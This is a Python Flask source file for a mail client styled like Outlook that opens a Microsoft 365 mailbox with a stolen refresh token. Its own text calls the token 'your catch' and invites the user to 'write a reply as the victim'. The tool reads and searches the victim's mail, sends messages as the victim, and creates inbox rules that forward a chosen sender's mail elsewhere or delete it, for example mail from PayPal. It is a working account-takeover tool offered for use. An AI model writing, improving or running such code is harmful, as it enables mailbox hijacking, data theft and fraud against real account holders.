import os, uuid, html, requests
from flask import Flask, request, redirect, session, render_template_string, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-me-please")

GRAPH = "https://graph.microsoft.com/v1.0"
TOKEN_EP = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
SCOPE = "https://graph.microsoft.com/.default offline_access"
CLIENT_ID = os.environ.get("CLIENT_ID", "04b07795-8ddb-461a-bbee-02f9e1bf7b46")

STORE = {}

FOLDERS = [("inbox","Inbox"),("sentitems","Sent Items"),("drafts","Drafts"),
           ("deleteditems","Deleted Items"),("junkemail","Junk Email"),("archive","Archive")]

def get_tokens():
    return STORE.get(session.get("sid"))

def refresh_access(t):
    r = requests.post(TOKEN_EP, data={
        "client_id": CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": t["refresh"],
        "scope": SCOPE,
    }, timeout=20)
    if r.status_code != 200:
        return None
    j = r.json()
    t["access"] = j["access_token"]
    if "refresh_token" in j:
        t["refresh"] = j["refresh_token"]
    return t["access"]

def call(path, params=None):
    t = get_tokens()
    if not t:
        return None, 401
    tok = t.get("access") or refresh_access(t)
    for _ in range(2):
        r = requests.get(GRAPH + path, headers={"Authorization": f"Bearer {tok}"},
                         params=params, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return r.json(), 200
    return {"error": "auth failed"}, 401

def post_call(path, payload):
    t = get_tokens()
    if not t:
        return {"error": "not logged in"}, 401
    tok = t.get("access") or refresh_access(t)
    for _ in range(2):
        r = requests.post(GRAPH + path, headers={
            "Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return (r.json() if r.text else {}), 200
    return {"error": "auth failed"}, 401

# ---------- login ----------
@app.route("/")
def home():
    if get_tokens():
        return redirect(url_for("inbox", folder="inbox"))
    return render_template_string(LOGIN, error="")

@app.route("/login", methods=["POST"])
def login():
    token = request.form.get("token", "").strip()
    sid = str(uuid.uuid4())
    t = {"refresh": token, "access": None}
    if not refresh_access(t):
        return render_template_string(LOGIN,
            error="Token rejected. Make sure CLIENT_ID matches the one that issued it.")
    STORE[sid] = t
    session["sid"] = sid
    return redirect(url_for("inbox", folder="inbox"))

@app.route("/logout")
def logout():
    STORE.pop(session.get("sid"), None)
    session.clear()
    return redirect(url_for("home"))

# ---------- mail ----------
@app.route("/mail/<folder>")
def inbox(folder):
    q = request.args.get("q")
    if q:
        data, code = call("/me/messages", {"$search": f'"{q}"', "$top": 40,
            "$select": "id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments"})
    else:
        data, code = call(f"/me/mailFolders/{folder}/messages",
            {"$top": 40, "$orderby": "receivedDateTime desc",
             "$select": "id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments"})
    if code != 200:
        return render_template_string(LOGIN, error=f"Graph error: {html.escape(str(data))[:300]}")
    me, _ = call("/me", {"$select": "displayName,userPrincipalName"})
    return render_template_string(OWA, msgs=data.get("value", []), folders=FOLDERS,
                                  active=folder, me=me or {}, q=q or "")

@app.route("/message/<mid>")
def message(mid):
    data, code = call(f"/me/messages/{mid}",
        {"$select": "id,subject,from,toRecipients,ccRecipients,receivedDateTime,body"})
    if code != 200:
        return redirect(url_for("inbox", folder="inbox"))
    body = data.get("body", {})
    if body.get("contentType") == "html":
        content = body.get("content", "")
    else:
        content = "<pre style='white-space:pre-wrap'>" + html.escape(body.get("content","")) + "</pre>"
    return render_template_string(READ, m=data, content=content, folders=FOLDERS)

# ---------- send / reply ----------
@app.route("/compose", methods=["GET", "POST"])
def compose():
    if request.method == "POST":
        to = request.form.get("to", "").strip()
        subject = request.form.get("subject", "")
        body = request.form.get("body", "").replace("\n", "<br>")
        payload = {"message": {
            "subject": subject,
            "body": {"contentType": "HTML", "content": body},
            "toRecipients": [{"emailAddress": {"address": a.strip()}}
                             for a in to.split(",") if a.strip()],
        }, "saveToSentItems": True}
        data, code = post_call("/me/sendMail", payload)
        if code == 202:
            return redirect(url_for("inbox", folder="sentitems"))
        return render_template_string(COMPOSE, error=str(data)[:300], folders=FOLDERS,
                                      to=to, subject=subject, body=request.form.get("body",""))
    return render_template_string(COMPOSE, error="", folders=FOLDERS, to="", subject="", body="")

@app.route("/reply/<mid>", methods=["GET", "POST"])
def reply(mid):
    if request.method == "POST":
        comment = request.form.get("body", "")
        data, code = post_call(f"/me/messages/{mid}/reply",
                               {"comment": comment.replace("\n","<br>")})
        if code == 202:
            return redirect(url_for("inbox", folder="sentitems"))
        return render_template_string(COMPOSE, error=str(data)[:300], folders=FOLDERS,
                                      to="", subject="Re:", body=comment)
    data, code = call(f"/me/messages/{mid}", {"$select": "subject,from"})
    if code != 200:
        return redirect(url_for("inbox", folder="inbox"))
    frm = data.get("from", {}).get("emailAddress", {}).get("address", "")
    return render_template_string(COMPOSE, error="", folders=FOLDERS,
                                  to=frm, subject="Re: " + (data.get("subject") or ""), body="")

# ---------- rules ----------
@app.route("/rules", methods=["GET", "POST"])
def rules():
    if request.method == "POST":
        action = request.form.get("action")
        sender = request.form.get("sender", "").strip()
        target = request.form.get("target", "").strip()
        if action == "delete" and sender:
            payload = {"displayName": f"Rule {sender[:20]}", "sequence": 1, "isEnabled": True,
                       "conditions": {"fromAddresses": [{"emailAddress": {"address": sender}}]},
                       "actions": {"moveToFolder": "deleteditems"}}
        elif action == "forward" and sender and target:
            payload = {"displayName": f"Rule {sender[:20]}", "sequence": 1, "isEnabled": True,
                       "conditions": {"fromAddresses": [{"emailAddress": {"address": sender}}]},
                       "actions": {"forwardTo": [{"emailAddress": {"address": target}}]}}
        else:
            payload = None
        if payload:
            post_call("/me/mailFolders/inbox/messageRules", payload)
        return redirect(url_for("rules"))
    data, code = call("/me/mailFolders/inbox/messageRules")
    rulelist = data if code == 200 and isinstance(data, dict) else {"value": []}
    return render_template_string(RULES, rules=rulelist.get("value", []), folders=FOLDERS)

@app.route("/rules/<rid>/delete", methods=["POST"])
def del_rule(rid):
    t = get_tokens()
    tok = t.get("access") or refresh_access(t)
    requests.delete(GRAPH + f"/me/mailFolders/inbox/messageRules/{rid}",
                    headers={"Authorization": f"Bearer {tok}"}, timeout=20)
    return redirect(url_for("rules"))

# ---------- templates (shared style) ----------
BASE_CSS = """
<style>
*{box-sizing:border-box}
body{margin:0;font-family:'Segoe UI',system-ui,sans-serif;background:#faf9f8;color:#242424;font-size:14px}
.top{height:48px;background:#0f6cbd;display:flex;align-items:center;padding:0 16px;gap:14px;color:#fff}
.top b{font-size:15px}.top .sp{flex:1}
.top a{color:#fff;text-decoration:none;font-size:13px}
.wrap{display:flex;height:calc(100vh - 48px)}
.rail{width:230px;background:#f3f2f1;border-right:1px solid #e1dfdd;padding:10px 0}
.rail a{display:block;padding:8px 16px;color:#242424;text-decoration:none;font-size:13px;border-left:3px solid transparent}
.rail a:hover{background:#e8e6e4}
.rail a.on{background:#e0efd9;border-left-color:#0f6cbd;font-weight:600}
.list{width:380px;border-right:1px solid #e1dfdd;overflow:auto;background:#fff}
.row{padding:10px 14px;border-bottom:1px solid #f3f2f1;display:block;text-decoration:none;color:inherit}
.row:hover{background:#f5f5f5}.row.un .sub{font-weight:700}
.from{font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sub{font-size:13px;margin:2px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.prev{font-size:12px;color:#616161;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.dt{float:right;font-size:11px;color:#616161}
.main{flex:1;overflow:auto;background:#fff;padding:24px 32px}
.main h2{font-size:20px;margin:0 0 6px}.meta{font-size:12px;color:#616161;margin-bottom:18px}
input,textarea,select{width:100%;padding:9px;border:1px solid #ccc;border-radius:4px;font:inherit;margin-bottom:10px}
button{padding:10px 18px;background:#0f6cbd;color:#fff;border:0;border-radius:4px;font-weight:600;cursor:pointer}
.err{background:#fde7e9;color:#a4262c;padding:10px;border-radius:4px;font-size:12px;margin-bottom:12px}
.card{background:#fff;padding:28px;width:480px;border:1px solid #e1dfdd;border-radius:6px;margin:40px auto}
table{width:100%;border-collapse:collapse}td,th{padding:8px;border-bottom:1px solid #eee;font-size:13px;text-align:left}
</style>
"""

LOGIN = """<!doctype html><html><head><meta charset="utf-8"><title>Outlook</title>""" + BASE_CSS + """
</head><body><div class="card"><h2 style="margin:0 0 4px">Outlook</h2>
<p style="color:#616161;font-size:13px">Paste the refresh token from your catch.</p>
{% if error %}<div class="err">{{ error }}</div>{% endif %}
<form method="post" action="/login">
<input name="token" placeholder="Refresh token" autofocus>
<button type="submit">Open mailbox</button></form></div></body></html>"""

OWA = """<!doctype html><html><head><meta charset="utf-8"><title>Mail - Outlook</title>""" + BASE_CSS + """
</head><body>
<div class="top"><b>Outlook</b><span class="sp"></span>
<a href="/compose">+ New</a> <a href="/rules">Rules</a> <a href="/logout">Sign out</a></div>
<div class="wrap"><div class="rail">
{% for k,label in folders %}<a class="{{ 'on' if k==active else '' }}" href="/mail/{{ k }}">{{ label }}</a>{% endfor %}
</div><div class="list">
<form style="padding:8px 14px;border-bottom:1px solid #e1dfdd" method="get" action="/mail/{{ active }}">
<input name="q" value="{{ q }}" placeholder="Search mail" style="margin:0"></form>
{% if msgs %}{% for m in msgs %}
<a class="row {{ '' if m.isRead else 'un' }}" href="/message/{{ m.id }}">
<div class="from"><span class="dt">{{ m.receivedDateTime[5:16].replace('T',' ') }}</span>
{{ m['from']['emailAddress']['name'] if m['from'] else '' }}</div>
<div class="sub">{{ m.subject or '(no subject)' }}{% if m.hasAttachments %} 📎{% endif %}</div>
<div class="prev">{{ m.bodyPreview or '' }}</div></a>
{% endfor %}{% else %}<div style="padding:40px;color:#616161;text-align:center">No messages.</div>{% endif %}
</div><div class="main"><div style="padding:40px;color:#616161;text-align:center">Select a message to read it.</div>
</div></div></body></html>"""

READ = """<!doctype html><html><head><meta charset="utf-8"><title>Message</title>""" + BASE_CSS + """
</head><body>
<div class="top"><b>Outlook</b><span class="sp"></span><a href="/mail/inbox">Back</a></div>
<div class="wrap"><div class="rail">
{% for k,label in folders %}<a href="/mail/{{ k }}">{{ label }}</a>{% endfor %}</div>
<div class="main"><h2>{{ m.subject or '(no subject)' }}</h2>
<div class="meta"><b>{{ m['from']['emailAddress']['name'] if m['from'] else '' }}</b>
&lt;{{ m['from']['emailAddress']['address'] if m['from'] else '' }}&gt;<br>
{{ m.receivedDateTime[:16].replace('T',' ') }}</div>
<div>{{ content|safe }}</div><br>
<form method="post" action="/reply/{{ m.id }}">
<textarea name="body" rows="5" placeholder="Write a reply as the victim..."></textarea>
<button type="submit">Send Reply</button></form></div></div></body></html>"""

COMPOSE = """<!doctype html><html><head><meta charset="utf-8"><title>New message</title>""" + BASE_CSS + """
</head><body><div class="top"><b>Outlook</b><span class="sp"></span><a href="/mail/inbox">Back</a></div>
<div class="card"><h2 style="margin:0 0 12px">New message</h2>
{% if error %}<div class="err">{{ error }}</div>{% endif %}
<form method="post" action="/compose">
<input name="to" value="{{ to }}" placeholder="To (comma separated)">
<input name="subject" value="{{ subject }}" placeholder="Subject">
<textarea name="body" rows="8" placeholder="Message">{{ body }}</textarea>
<button type="submit">Send</button></form></div></body></html>"""

RULES = """<!doctype html><html><head><meta charset="utf-8"><title>Rules</title>""" + BASE_CSS + """
</head><body><div class="top"><b>Outlook</b><span class="sp"></span><a href="/mail/inbox">Back to mail</a></div>
<div class="card"><h2 style="margin:0 0 12px">Inbox rules</h2>
<form method="post" action="/rules">
<select name="action"><option value="forward">Forward emails from sender to...</option>
<option value="delete">Delete emails from sender</option></select>
<input name="sender" placeholder="Sender email (e.g. paypal.com sender)">
<input name="target" placeholder="Forward to email (only for forward)">
<button type="submit">Create rule</button></form>
<h3 style="margin:20px 0 6px;font-size:15px">Existing rules</h3>
<table><tr><th>Name</th><th></th></tr>
{% for r in rules %}<tr><td>{{ r.displayName }}</td>
<td><form method="post" action="/rules/{{ r.id }}/delete"><button>Delete</button></form></td></tr>
{% else %}<tr><td colspan="2">No rules yet.</td></tr>{% endfor %}</table>
</div></body></html>"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
